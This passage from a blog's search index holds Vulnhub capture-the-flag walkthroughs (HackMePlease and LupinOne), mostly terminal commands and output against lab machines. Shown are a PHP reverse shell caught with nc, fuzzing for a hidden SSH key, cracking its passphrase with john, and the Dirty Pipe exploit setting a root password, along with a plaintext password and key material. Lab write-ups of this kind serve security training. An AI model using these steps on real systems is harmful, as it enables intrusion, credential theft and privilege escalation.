2018, Oracle, MariaDB Corporation Ab and others. Type 'help;' or '\\h' for help. Type '\\c' to clear the current input statement. MySQL [seeddms]\u003e show databases; +--------------------+ | Database | +--------------------+ | information_schema | | mysql | | performance_schema | | seeddms | | sys | +--------------------+ 5 rows in set (0.002 sec) MySQL [(none)]\u003e use seeddms; Reading table information for completion of table and column names You can turn off this feature to get a quicker startup with -A Database changed MySQL [seeddms]\u003e show tables; +------------------------------+ | Tables_in_seeddms | +------------------------------+ | tblACLs | | tblAttributeDefinitions | | tblCategory | | tblDocumentApproveLog | | tblDocumentApprovers | | tblDocumentAttributes | | tblDocumentCategory | | tblDocumentContent | | tblDocumentContentAttributes | | tblDocumentFiles | | tblDocumentLinks | | tblDocumentLocks | | tblDocumentReviewLog | | tblDocumentReviewers | | tblDocumentStatus | | tblDocumentStatusLog | | tblDocuments | | tblEvents | | tblFolderAttributes | | tblFolders | | tblGroupMembers | | tblGroups | | tblKeywordCategories | | tblKeywords | | tblMandatoryApprovers | | tblMandatoryReviewers | | tblNotify | | tblSessions | | tblUserImages | | tblUserPasswordHistory | | tblUserPasswordRequest | | tblUsers | | tblVersion | | tblWorkflowActions | | tblWorkflowDocumentContent | | tblWorkflowLog | | tblWorkflowMandatoryWorkflow | | tblWorkflowStates | | tblWorkflowTransitionGroups | | tblWorkflowTransitionUsers | | tblWorkflowTransitions | | tblWorkflows | | users | +------------------------------+ 43 rows in set (0.003 sec) We can find users in table users: MySQL [seeddms]\u003e select * from users; +-------------+---------------------+--------------------+-----------------+ | Employee_id | Employee_first_name | Employee_last_name | Employee_passwd | +-------------+---------------------+--------------------+-----------------+ | 1 | saket | saurav | Saket@#$1337 | +-------------+---------------------+--------------------+-----------------+ 1 row in set (0.003 sec) the password is plaintext. We can found users in table tblUsers: And we can find a admin user and password, try to decrypt the passwd with MD5: Failed. Well, we can try to update the passwd of admin: ![image-20231114193704173](/Users/v4ler1an/Library/Application Support/typora-user-images/image-20231114193704173.png) Ok, let us login the website: And then, we can use exploit now. ","date":"2023-11-11","objectID":"/2023/11/vulnhub_empire_hackmeplease/:4:2","tags":["Vulnhub"],"title":"Vulnhub HackMePlease","uri":"/2023/11/vulnhub_empire_hackmeplease/"},{"categories":["Web"],"content":"3. Exploit the website We upload a php reverse shell to website: We need to attention at the file ID: Because when we access the shell file, we need to know the id of it: After we upload the file twice, the ID changed to 5. And then, we can access the shell through uri /data/1048576/5/shell.php, and listen on kali: ┌──(v4ler1an㉿kali)-[~/Documents/tmp] └─$ nc -lvp 1234 listening on [any] 1234 ... 172.16.86.150: inverse host lookup failed: Unknown host connect to [172.16.86.138] from (UNKNOWN) [172.16.86.150] 55002 Linux ubuntu 5.8.0-59-generic #66~20.04.1-Ubuntu SMP Thu Jun 17 11:14:10 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux 03:56:09 up 43 min, 0 users, load average: 0.74, 0.22, 0.13 USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT uid=33(www-data) gid=33(www-data) groups=33(www-data) /bin/sh: 0: can't access tty; job control turned off $ id uid=33(www-data) gid=33(www-data) groups=33(www-data) ","date":"2023-11-11","objectID":"/2023/11/vulnhub_empire_hackmeplease/:4:3","tags":["Vulnhub"],"title":"Vulnhub HackMePlease","uri":"/2023/11/vulnhub_empire_hackmeplease/"},{"categories":["Web"],"content":"4. Privilege Escalation First, turn on the interactive shell with python: $ python3 -c 'import pty;pty.spawn(\"/bin/bash\")' www-data@ubuntu:/$ id id uid=33(www-data) gid=33(www-data) groups=33(www-data) Look up users: www-data@ubuntu:/$ cat /etc/passwd cat /etc/passwd root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin messagebus:x:103:106::/nonexistent:/usr/sbin/nologin syslog:x:104:110::/home/syslog:/usr/sbin/nologin _apt:x:105:65534::/nonexistent:/usr/sbin/nologin tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false uuidd:x:107:114::/run/uuidd:/usr/sbin/nologin tcpdump:x:108:115::/nonexistent:/usr/sbin/nologin avahi-autoipd:x:109:116:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin usbmux:x:110:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin rtkit:x:111:117:RealtimeKit,,,:/proc:/usr/sbin/nologin dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin cups-pk-helper:x:113:120:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin speech-dispatcher:x:114:29:Speech Dispatcher,,,:/run/speech-dispatcher:/bin/false avahi:x:115:121:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin kernoops:x:116:65534:Kernel Oops Tracking Daemon,,,:/:/usr/sbin/nologin saned:x:117:123::/var/lib/saned:/usr/sbin/nologin nm-openvpn:x:118:124:NetworkManager OpenVPN,,,:/var/lib/openvpn/chroot:/usr/sbin/nologin hplip:x:119:7:HPLIP system user,,,:/run/hplip:/bin/false whoopsie:x:120:125::/nonexistent:/bin/false colord:x:121:126:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin geoclue:x:122:127::/var/lib/geoclue:/usr/sbin/nologin pulse:x:123:128:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin gnome-initial-setup:x:124:65534::/run/gnome-initial-setup/:/bin/false gdm:x:125:130:Gnome Display Manager:/var/lib/gdm3:/bin/false saket:x:1000:1000:Ubuntu_CTF,,,:/home/saket:/bin/bash systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin mysql:x:126:133:MySQL Server,,,:/nonexistent:/bin/false Well, we found the user saket which we has seen it in users table. Try to switch to it with password Saket@#$1337 and su to root: saket@ubuntu:/$ id id uid=1000(saket) gid=1000(saket) groups=1000(saket),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),131(lxd),132(sambashare) saket@ubuntu:/$ sudo -l sudo -l [sudo] password for saket: Saket@#$1337 Matching Defaults entries for saket on ubuntu: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User saket may run the following commands on ubuntu: (ALL : ALL) ALL saket@ubuntu:/$ sudo su sudo su root@ubuntu:/# id id uid=0(root) gid=0(root) groups=0(root) root@ubuntu:/# ls /root ls /root app.apk Documents Music Public Templates Desktop Downloads Pictures snap Videos ","date":"2023-11-11","objectID":"/2023/11/vulnhub_empire_hackmeplease/:5:0","tags":["Vulnhub"],"title":"Vulnhub HackMePlease","uri":"/2023/11/vulnhub_empire_hackmeplease/"},{"categories":["Web"],"content":"Notes","date":"2023-11-11","objectID":"/2023/11/vulnhub_empire_hackmeplease/:6:0","tags":["Vulnhub"],"title":"Vulnhub HackMePlease","uri":"/2023/11/vulnhub_empire_hackmeplease/"},{"categories":["Web"],"content":"Vulnhub Training -- Empire LupinOne","date":"2023-11-11","objectID":"/2023/11/vulnhub_empire_lupinone/","tags":["Vulnhub"],"title":"Vulnhub Empire LupinOne","uri":"/2023/11/vulnhub_empire_lupinone/"},{"categories":["Web"],"content":"Vulnhub Training Waklthrough – Empire LupinOne ","date":"2023-11-11","objectID":"/2023/11/vulnhub_empire_lupinone/:0:0","tags":["Vulnhub"],"title":"Vulnhub Empire LupinOne","uri":"/2023/11/vulnhub_empire_lupinone/"},{"categories":["Web"],"content":"Knowledge ffuf – find secret file base58 encode dirty_pipe privilege eslacation linpeas – a script that search for possible paths to escalate privileges on Linux/Unix*/MacOS hosts Python Library Hijacking Privilege Eslacation with pip ","date":"2023-11-11","objectID":"/2023/11/vulnhub_empire_lupinone/:1:0","tags":["Vulnhub"],"title":"Vulnhub Empire LupinOne","uri":"/2023/11/vulnhub_empire_lupinone/"},{"categories":["Web"],"content":"1. Environment Setup Download the zip file, extract it and import into VMware or VirtualBox. ","date":"2023-11-11","objectID":"/2023/11/vulnhub_empire_lupinone/:2:0","tags":["Vulnhub"],"title":"Vulnhub Empire LupinOne","uri":"/2023/11/vulnhub_empire_lupinone/"},{"categories":["Web"],"content":"2. Reconnaisence ","date":"2023-11-11","objectID":"/2023/11/vulnhub_empire_lupinone/:3:0","tags":["Vulnhub"],"title":"Vulnhub Empire LupinOne","uri":"/2023/11/vulnhub_empire_lupinone/"},{"categories":["Web"],"content":"1. IP Address arp-scan to scan the ip addr: ┌──(v4ler1an㉿kali)-[/usr/share/seclists/Discovery/Web-Content] └─$ sudo arp-scan -l [sudo] password for v4ler1an: Interface: eth0, type: EN10MB, MAC: 00:0c:29:9d:5b:9e, IPv4: 172.16.86.138 Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan) 172.16.86.1 5e:52:30:c9:b7:65 (Unknown: locally administered) 172.16.86.2 00:50:56:fd:f8:ec VMware, Inc. 172.16.86.148 00:0c:29:c2:93:45 VMware, Inc. 172.16.86.254 00:50:56:fa:b5:64 VMware, Inc. 8 packets received by filter, 0 packets dropped by kernel Ending arp-scan 1.10.0: 256 hosts scanned in 2.405 seconds (106.44 hosts/sec). 4 responded ","date":"2023-11-11","objectID":"/2023/11/vulnhub_empire_lupinone/:3:1","tags":["Vulnhub"],"title":"Vulnhub Empire LupinOne","uri":"/2023/11/vulnhub_empire_lupinone/"},{"categories":["Web"],"content":"2. Port Info nmap scan: ┌──(v4ler1an㉿kali)-[/usr/share/seclists/Discovery/Web-Content] └─$ nmap -T4 -A -Pn 172.16.86.148 Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-11-13 03:03 EST Nmap scan report for 172.16.86.148 Host is up (0.0019s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.4p1 Debian 5 (protocol 2.0) | ssh-hostkey: | 3072 ed:ea:d9:d3:af:19:9c:8e:4e:0f:31:db:f2:5d:12:79 (RSA) | 256 bf:9f:a9:93:c5:87:21:a3:6b:6f:9e:e6:87:61:f5:19 (ECDSA) |_ 256 ac:18:ec:cc:35:c0:51:f5:6f:47:74:c3:01:95:b4:0f (ED25519) 80/tcp open http Apache httpd 2.4.48 ((Debian)) |_http-title: Site doesn't have a title (text/html). | http-robots.txt: 1 disallowed entry |_/~myfiles |_http-server-header: Apache/2.4.48 (Debian) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 6.55 seconds Enable port info: port service 22 ssh 80 http web nmap result display a robots.txt file, access: ┌──(v4ler1an㉿kali)-[/usr/share/seclists/Discovery/Web-Content] └─$ curl http://172.16.86.148/robots.txt User-agent: * Disallow: /~myfiles ┌──(v4ler1an㉿kali)-[/usr/share/seclists/Discovery/Web-Content] └─$ curl http://172.16.86.148/~myfiles \u003c!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\"\u003e \u003chtml\u003e\u003chead\u003e \u003ctitle\u003e301 Moved Permanently\u003c/title\u003e \u003c/head\u003e\u003cbody\u003e \u003ch1\u003eMoved Permanently\u003c/h1\u003e \u003cp\u003eThe document has moved \u003ca href=\"http://172.16.86.148/~myfiles/\"\u003ehere\u003c/a\u003e.\u003c/p\u003e \u003chr\u003e \u003caddress\u003eApache/2.4.48 (Debian) Server at 172.16.86.148 Port 80\u003c/address\u003e \u003c/body\u003e\u003c/html\u003e And can not access ~myfiles, but it give us a hint sting, keep a mind in it. ","date":"2023-11-11","objectID":"/2023/11/vulnhub_empire_lupinone/:3:2","tags":["Vulnhub"],"title":"Vulnhub Empire LupinOne","uri":"/2023/11/vulnhub_empire_lupinone/"},{"categories":["Web"],"content":"3. Web Directory Let us scan the web directory: ┌──(v4ler1an㉿kali)-[/usr/share/seclists/Discovery/Web-Content] └─$ gobuster dir -u http://172.16.86.148:80/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt =============================================================== Gobuster v3.6 by OJ Reeves (@TheColonial) \u0026 Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://172.16.86.148:80/ [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.6 [+] Timeout: 10s =============================================================== Starting gobuster in directory enumeration mode =============================================================== /image (Status: 301) [Size: 314] [--\u003e http://172.16.86.148/image/] /manual (Status: 301) [Size: 315] [--\u003e http://172.16.86.148/manual/] /javascript (Status: 301) [Size: 319] [--\u003e http://172.16.86.148/javascript/] /server-status (Status: 403) [Size: 278] Progress: 220560 / 220561 (100.00%) =============================================================== Finished =============================================================== Nothing useful. ","date":"2023-11-11","objectID":"/2023/11/vulnhub_empire_lupinone/:3:3","tags":["Vulnhub"],"title":"Vulnhub Empire LupinOne","uri":"/2023/11/vulnhub_empire_lupinone/"},{"categories":["Web"],"content":"3. Exploit ","date":"2023-11-11","objectID":"/2023/11/vulnhub_empire_lupinone/:4:0","tags":["Vulnhub"],"title":"Vulnhub Empire LupinOne","uri":"/2023/11/vulnhub_empire_lupinone/"},{"categories":["Web"],"content":"1. Look for ssh private key Ok, return the ~myfiles, let’s fuzz the path of it: ┌──(v4ler1an㉿kali)-[/usr/share/seclists/Discovery/Web-Content] └─$ ffuf -ic -c -r -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 'http://172.16.86.148/~FUZZ' -fs 138 /'___\\ /'___\\ /'___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v2.1.0-dev ________________________________________________ :: Method : GET :: URL : http://172.16.86.148/~FUZZ :: Wordlist : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt :: Follow redirects : true :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200-299,301,302,307,401,403,405,500 :: Filter : Response size: 138 ________________________________________________ secret [Status: 200, Size: 331, Words: 52, Lines: 6, Duration: 7ms] :: Progress: [220547/220547] :: Job [1/1] :: 7407 req/sec :: Duration: [0:00:35] :: Errors: 0 :: Well done, we found a secret file: Fine, we need to find out the ssh private key file. As we all know, the ssh private key named .[key_file], so we should fuzz ~secret/.[file]: ┌──(v4ler1an㉿kali)-[/usr/share/seclists/Discovery/Web-Content] └─$ ffuf -ic -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u 'http://172.16.86.148/~secret/.FUZZ' -mc 200,301 -e .txt,.html -t 60 /'___\\ /'___\\ /'___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v2.1.0-dev ________________________________________________ :: Method : GET :: URL : http://172.16.86.148/~secret/.FUZZ :: Wordlist : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt :: Extensions : .txt .html :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 60 :: Matcher : Response status: 200,301 ________________________________________________ [Status: 200, Size: 331, Words: 52, Lines: 6, Duration: 19ms] [Status: 200, Size: 331, Words: 52, Lines: 6, Duration: 5ms] mysecret.txt [Status: 200, Size: 4689, Words: 1, Lines: 2, Duration: 3ms] :: Progress: [661641/661641] :: Job [1/1] :: 9090 req/sec :: Duration: [0:01:30] :: Errors: 0 :: Let’s access the file: ┌──(v4ler1an㉿kali)-[~/Documents/tools/scan/wfuzz] └─$ curl http://172.16.86.148/~secret/.mysecret.txt cGxD6KNZQddY6iCsSuqPzUdqSx4F5ohDYnArU3kw5dmvTURqcaTrncHC3NLKBqFM2ywrNbRTW3eTpUvEz9qFuBnyhAK8TWu9cFxLoscWUrc4rLcRafiVvxPRpP692Bw5bshu6ZZpixzJWvNZhPEoQoJRx7jUnupsEhcCgjuXD7BN1TMZGL2nUxcDQwahUC1u6NLSK81Yh9LkND67WD87Ud2JpdUwjMossSeHEbvYjCEYBnKRPpDhSgL7jmTzxmtZxS9wX6DNLmQBsNT936L6VwYdEPKuLeY6wuyYmffQYZEVXhDtK6pokmA3Jo2Q83cVok6x74M5DA1TdjKvEsVGLvRMkkDpshztiGCaDu4uceLw3iLYvNVZK75k9zK9E2qcdwP7yWugahCn5HyoaooLeBDiCAojj4JUxafQUcmfocvugzn81GAJ8LdxQjosS1tHmriYtwp8pGf4Nfq5FjqmGAdvA2ZPMUAVWVHgkeSVEnooKT8sxGUfZxgnHAfER49nZnz1YgcFkR73rWfP5NwEpsCgeCWYSYh3XeF3dUqBBpf6xMJnS7wmZa9oWZVd8Rxs1zrXawVKSLxardUEfRLh6usnUmMMAnSmTyuvMTnjK2vzTBbd5djvhJKaY2szXFetZdWBsRFhUwReUk7DkhmCPb2mQNoTSuRpnfUG8CWaD3L2Q9UHepvrs67YGZJWwk54rmT6v1pHHLDR8gBC9ZTfdDtzBaZo8sesPQVbuKA9VEVsgw1xVvRyRZz8JH6DEzqrEneoibQUdJxLVNTMXpYXGi68RA4V1pa5yaj2UQ6xRpF6otrWTerjwALN67preSWWH4vY3MBv9Cu6358KWeVC1YZAXvBRwoZPXtquY9EiFL6i3KXFe3Y7W4Li7jF8vFrK6woYGy8soJJYEbXQp2NWqaJNcCQX8umkiGfNFNiRoTfQmz29wBZFJPtPJ98UkQwKJfSW9XKvDJwduMRWey2j61yaH4ij5uZQXDs37FNV7TBj71GGFGEh8vSKP2gg5nLcACbkzF4zjqdikP3TFNWGnij5az3AxveN3EUFnuDtfB4ADRt57UokLMDi1V73Pt5PQe8g8SLjuvtNYpo8AqyC3zTMSmP8dFQgoborCXEMJz6npX6QhgXqpbhS58yVRhpW21Nz4xFkDL8QFCVH2beL1PZxEghmdVdY9N3pVrMBUS7MznYasCruXqWVE55RPuSPrMEcRLoCa1XbYtG5JxqfbEg2aw8BdMirLLWhuxbm3hxrr9ZizxDDyu3i1PLkpHgQw3zH4GTK2mb5fxuu9W6nGWW24wjGbxHW6aTneLweh74jFWKzfSLgEVyc7RyAS7Qkwkud9ozyBxxsV4VEdf8mW5g3nTDyKE69P34SkpQgDVNKJvDfJvZbL8o6BfPjEPi125edV9JbCyNRFKKpTxpq7QSruk7L5LEXG8H4rsLyv6djUT9nJGWQKRPi3Bugawd7ixMUYoRMhagBmGYNafi4JBapacTMwG95wPyZT8Mz6gALq5Vmr8tkk9ry4Ph4U2ErihvNiFQVS7U9XBwQHc6fhrDHz2objdeDGvuVHzPgqMeRMZt","date":"2023-11-11","objectID":"/2023/11/vulnhub_empire_lupinone/:4:1","tags":["Vulnhub"],"title":"Vulnhub Empire LupinOne","uri":"/2023/11/vulnhub_empire_lupinone/"},{"categories":["Web"],"content":"2. unpasswd the ssh private key Well, the key file has passphase, we need to unlock it. It’s like has been encoded, check it: It is encoded by base58, so decode it: We got the private key file. And then broute force it with john: ┌──(v4ler1an㉿kali)-[~/Documents/tools/crack] └─$ python ssh2join.py hash\u003ehash1 ┌──(v4ler1an㉿kali)-[~/Documents/tools/crack] └─$ cat hash1 hash:$sshng$2$16$f2df77361693c16003677b8a33deeb06$2486$6f70656e7373682d6b65792d7631000000000a6165733235362d636263000000066263727970740000001800000010f2df77361693c16003677b8a33deeb06000000100000000100000217000000077373682d727361000000030100010000020100c1cc78f325cbe4f465e2cada65813f73fe63fdd4da8e53d428030a29e493718447e6fe3e4a426763fc907bb10d61068b4e36fa9a01d9ac2be3982fd1fa3526f48cc6cc738b2816b0629e82c4931f3de01fcfa944ce0deb0c115fda2b6d9429e81dc2527d02b7fed58e3c57cea09334bac73a0a9ff131564029b1d8a6211bc686cbf864c98c6449132284c41b3eeb683ed01c31178aeb16974864877deb4190ab16c6454fb274c0a80bad7da99a83100baa38d8e40968d2c1cd3c4263a8d4d810d0102a15b913cbede25ad3f9d17c268eac8ccf7d9fcd35882efc395fd4299b5c4b02566943ef571b3eac1f58a19fde159e12bd16750844b937f93b20c80b051b83474b88acf891cb2461c0f31f4667683b268e862fdae2d52e2d7d8eb7e7a7fb55a0b6ca9b7f489a657a26e6e3e899a91d77b07b02a2bfacf59cd13c9a41cca58e4885ed1c2ddcafdf5e9b148f0efb7cb99b780f22151493bf02e67d1550e3d240cb31e7a77e07d1f66c5888da5a35f264c56b06b4a5f5dd701557664a2e5f79e5641d7f5e88a9ef52c7de43c8ed4edf3eccf91321483d621a10db119b39dbb58f5a8d085b8c70231429408735c98b82c667a9a368612297ef60e14ee98ed100a98bf5fb7c7c17ecee899b1574caffeba31ae1eea2c0f2ea9adceddd488519be087b5c5a5907fb527968294ca32ef33005b6f781161a9016d0029a0e3611a8610000075064b8515cb4008dae50f1375f34bdccea9975ecfa87dd1520e27a23612822dd4aa143b1200b69790b5fc0c50e9158db7eaa404d69a02f8b26c3c72584a964eaf47068ed5a932431c067cc3f6eca70a3859f628da3d8fef318ee6b4764d098f127a8580c585d3a0acb672effea55c8643be8a62ddc9d004fbc00d8e47768c324d28d4ba28ceecaf3ab07771730787be7305f810c8079e0fb2f2606fdbef3eb31af57165c6bf839ef6097c5749795b40ec3f011f00ae100fe1225136416857661109edfc5a1404a7847a93edf8b4afa452811a5406f053e21c858c8cf196ab4af1d5a44bc550f8803521c267f6fea5d290b41cd3939fd51ff264dd03dc1faf44272c7cfe0444fe095063acfa9c2eaea06e0090897e80ec59d2158926fd11d5282b73dd66055718c26b943c5441e5814c1c359b62667422f719b54c51b12936fee583599716e2d0ec90454f7edaea137e9fb66f5e27f9d60ec66837165b8e8e1c178e0f4c5d1653a53452c256ea60dc943928e974a308ae2d93cbebe2a401f0e2c140c6db08e11538e3a6f6bbbcf5ed5af8508a8443cfe8b7f0a0118264c92a74ea9499ab2dbc27949a1b7a6b5cfa9d74e2ce89a6672c7e96d83d73dc5f78ef2d835c5ab027a5d4196e22150ac060e42c278812c0f51d80c15dbf878e61dfc33462a67fed2ee34f2cd8c69f1f4ba5577b33bd858e4ea5972f0a5062fbcfde4702dc264a0a8846537e33988a941e4255a7ead33e7d541f2f6fda0c5069020b955045f2a5cef2a73e4d007bd4323d4cc00f2fa00ae4361e64a4253c4ce8ac68654a4309fbe7d3c4f1b74767ec29d3ac53c621c4ce70d8b6c731aedf00bb8e966f92771937ea91074b9c77abdf274e26713d37539a2afbebb25f1f2de8428449ae0b5dc70f18d8697e19c4720be2e9004c0604353e1d094a7501ee38eb923a82d6af2a44db847161f21e0b5cef9270128e5178b755fe164158f0fc65e7e6f14cad14349a804078d048fd8db0f91a81cc3c1c7c54938b850fb8ff1b9a6a2ac2eecf4e717e160d9797dc4d058cff64ab7404607cdc8b1cd70a99392a7566c4fba5eef362790da0a818ed47d040dcfa825cf7881f43965d813e2d19c6df95ba99eaaa401c3c8123f09f8f589585b7c31bf51b7ab1a9a6a81b6dc74f777129cb2ca7e5ea99200b689233625a671f90a66a8e1e050e23bfbab129186ca6501b6cbdbbe34797b6b864dc021689ac358740d15eb9b61a4bdbbc011ec31dec5c4b4f9cc1b8615c950057e0237ecc503adc2cef77a156f8a7fac71eaa8f34c3703359ecf9a745ed1123cc5c2be3fb6b66ad17164ae909ee5f0581f9f18c9f3bf83cba9dc3331712488eb746a49b93ad19de2622c01f22420a2bb599b452c41bccb8fd8b5ca2290e8e7a44506841b1ba22140354af66840ef4d9d3a34495cbb987cf31b5ee72b894c257a93c65d3cab6e8ecef76a7af317f5bdc600155a1fb7ec631a1717b783b114b1f37a63adc49dfadd3eb7f618850febdb3df461fab02dab3b96da09a2d4dc98fa88236f09a57fe796990431cb97a0b0f32ef099391a3b01877c250aed836032b3ca471b29f29453034e7d7780f25360984b0cee07f7eedd672f36e6691f2a76213e78a8294160a892b6cacc106913cb6a41d4caf88d5","date":"2023-11-11","objectID":"/2023/11/vulnhub_empire_lupinone/:4:2","tags":["Vulnhub"],"title":"Vulnhub Empire LupinOne","uri":"/2023/11/vulnhub_empire_lupinone/"},{"categories":["Web"],"content":"4. Privilege Escalation Now, we need to get root privilege. ","date":"2023-11-11","objectID":"/2023/11/vulnhub_empire_lupinone/:5:0","tags":["Vulnhub"],"title":"Vulnhub Empire LupinOne","uri":"/2023/11/vulnhub_empire_lupinone/"},{"categories":["Web"],"content":"1. First method - Dirty_PIPE We found that the target has gcc, and kenel version is 5.10.0, so we can use dirty_pipe vulnerability to get root: icex64@LupinOne:~$ (uname -a || cat /proc/version) 2\u003e/dev/null Linux LupinOne 5.10.0-8-amd64 #1 SMP Debian 5.10.46-5 (2021-09-23) x86_64 GNU/Linux icex64@LupinOne:~$ gcc --version gcc (Debian 10.2.1-6) 10.2.1 20210110 Copyright (C) 2020 Free Software Foundation, Inc. This is free software; see the source for copying conditions. There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. icex64@LupinOne:~$ ./checker.sh 5 10 0 Vulnerable icex64@LupinOne:~$ cat checker.sh #!/bin/bash # usage # Check current kernel ./dpipe.sh # Check specific kernel ./dpipe.sh 5.10.102 kernel=$1 ver1=$(echo ${kernel:-$(uname -r | cut -d '-' -f1)} | cut -d '.' -f1) ver2=$(echo ${kernel:-$(uname -r | cut -d '-' -f1)} | cut -d '.' -f2) ver3=$(echo ${kernel:-$(uname -r | cut -d '-' -f1)} | cut -d '.' -f3) echo $ver1 $ver2 $ver3 if (( ${ver1:-0} \u003c 5 )) || (( ${ver1:-0} \u003e 5 )) || (( ${ver1:-0} == 5 \u0026\u0026 ${ver2:-0} \u003c 8 )) || (( ${ver1:-0} == 5 \u0026\u0026 ${ver2:-0} == 10 \u0026\u0026 ${ver3:-0} == 102 )) || (( ${ver1:-0} == 5 \u0026\u0026 ${ver2:-0} == 10 \u0026\u0026 ${ver3:-0} == 92 )) || (( ${ver1:-0} == 5 \u0026\u0026 ${ver2:-0} == 15 \u0026\u0026 ${ver3:-0} == 25 )) || (( ${ver1:-0} == 5 \u0026\u0026 ${ver2:-0} \u003e= 16 \u0026\u0026 ${ver3:-0} \u003e= 11 )) || (( ${ver1:-0} == 5 \u0026\u0026 ${ver2:-0} \u003e 16 )); then echo Not vulnerable exit 0 else echo Vulnerable exit 1 fi icex64@LupinOne:~$ ./a.out Backing up /etc/passwd to /tmp/passwd.bak ... Setting root password to \"aaron\"... system() function call seems to have failed :( icex64@LupinOne:~$ su Password: # id uid=0(root) gid=0(root) groups=0(root) # ls a.out checker.sh dirty_pipe.c user.txt # ls /root root.txt # cat /root/root.txt *,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(((((((((((((((((((((,,,,,,,,,,,,,,,,,,,,,,,,,,,,, , .\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026( /\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026 , \u0026\u0026\u0026\u0026\u0026\u0026* @\u0026\u0026\u0026\u0026\u0026\u0026 , *\u0026\u0026\u0026\u0026\u0026 \u0026\u0026\u0026\u0026\u0026\u0026 , \u0026\u0026\u0026\u0026\u0026 \u0026\u0026\u0026\u0026\u0026. , \u0026\u0026\u0026\u0026 ./#%@@\u0026#, \u0026\u0026\u0026\u0026* , \u0026%\u0026\u0026 \u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026**,**/\u0026\u0026(\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026 \u0026\u0026\u0026\u0026 , \u0026@(\u0026 \u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026.....,\u0026\u0026*\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026 \u0026\u0026\u0026\u0026 , .\u0026 \u0026 \u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026 \u0026\u0026.\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026 \u0026%\u0026 , @\u0026 \u0026 \u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026 \u0026\u0026 